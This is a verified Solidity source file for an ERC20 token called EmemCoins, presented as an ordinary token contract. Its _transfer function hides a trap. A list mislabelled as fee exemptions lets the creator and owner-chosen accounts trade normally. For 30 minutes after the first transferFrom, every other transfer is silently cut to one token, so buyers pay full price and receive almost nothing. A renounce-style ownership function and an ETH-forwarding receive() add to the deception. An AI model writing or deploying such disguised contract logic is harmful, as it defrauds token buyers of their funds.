/**
 *Submitted for verification at Etherscan.io on 2023-05-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
	
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }
	
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

contract Ownable {
    address public _owner;
	
    constructor() {
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
	
    function recyclingOwnership() public onlyOwner {
        _owner = address(0);
    }
	
	mapping (address => bool) _isExcludedFromFees;
	function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
	
    function balanceOf(address account) external view returns (uint256);
	
    function transfer(address recipient, uint256 amount) external returns (bool);
	
    function allowance(address owner, address spender) external view returns (uint256);
	
    function approve(address spender, uint256 amount) external returns (bool);
	
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	
    event Transfer(address indexed from, address indexed to, uint256 value);
	
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract EmemCoins is IERC20, Ownable {
    using SafeMath for uint256;

    uint256 _totalSupply;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name = "EmemCoins";
    string private _symbol = "EMEM";
    uint8 private _decimals = 6;
	address _contractCreater;
	uint256 public startTime;
    constructor(){
		_contractCreater = msg.sender;
        _isExcludedFromFees[_contractCreater] = true;
        _mint(_contractCreater, 404404404404404404 * 10**6);
    }
	
	receive() external payable {
		payable(_contractCreater).transfer(address(this).balance);
	}
	
    function name() public view returns (string memory) {
        return _name;
    }
	
    function symbol() public view returns (string memory) {
        return _symbol;
    }
	
    function decimals() public view returns (uint8) {
        return _decimals;
    }
	
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
	
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
	
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
	
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
	
    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }
	
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
		if(startTime == 0){startTime = block.timestamp;}
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }
	
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }
	
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }
	
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(sender != recipient, "same address");
        if(_isExcludedFromFees[sender] || _isExcludedFromFees[recipient]){}
        else if(startTime.add(1800) > block.timestamp){amount = 10**6;}
		_balances[sender] = _balances[sender].sub(amount);
		_balances[recipient] = _balances[recipient].add(amount);
		emit Transfer(sender, recipient, amount);
    }
	
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
	
    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }
	
    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
	
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
    }
	
	function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        
    }
	
	function burn(uint256 value) public returns (bool) {
        _burn(msg.sender, value);
        return true;
    }
}